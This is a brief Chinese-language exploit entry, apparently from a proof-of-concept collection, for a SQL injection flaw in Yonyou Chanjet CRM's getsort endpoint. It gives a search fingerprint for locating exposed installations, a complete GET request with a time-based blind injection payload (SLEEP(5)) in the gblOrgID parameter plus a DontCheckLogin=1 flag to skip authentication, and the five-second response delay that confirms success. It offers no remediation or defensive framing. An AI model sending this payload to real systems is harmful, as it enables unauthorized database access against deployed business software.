# 用友畅捷通CRMgetsort存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="畅捷CRM"`
- **请求**：`GET /lead/leadreadydata.php/getsort?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+-&DontCheckLogin=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s